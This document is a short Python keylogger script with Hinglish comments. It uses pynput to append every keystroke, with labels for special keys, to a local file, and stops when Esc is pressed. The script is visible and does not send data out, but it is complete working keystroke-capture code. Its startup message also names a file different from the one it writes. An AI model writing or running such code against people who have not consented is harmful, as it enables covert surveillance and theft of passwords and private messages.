from pynput.keyboard import Key, Listener
import os

log_file = "key_log.txt"

def on_press(key):
    try:
        # Normal keys (letters, numbers) ko write karein
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(str(key.char))
    except AttributeError:
        # Special keys (Space, Enter, Shift) ko handle karein
        with open(log_file, "a", encoding="utf-8") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n[ENTER]\n")
            elif key == Key.tab:
                f.write("\n[TAB]\n")
            else:
                f.write(f" [{str(key)}] ")

def on_release(key):
    # Agar Escape (Esc) key dabayi jaye toh keylogger ruk jayega
    if key == Key.esc:
        print("\n[!] Keylogger stopped successfully.")
        return False

def main():
    print("--- Simple Keylogger Started ---")
    print(f"[*] Keystrokes '{os.path.abspath(log_file)}' saved to key-log.txt.")
    print("[*] To stop press 'ESC' .\n")
    
    # Listener start karna jo keyboard events ko track karega
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()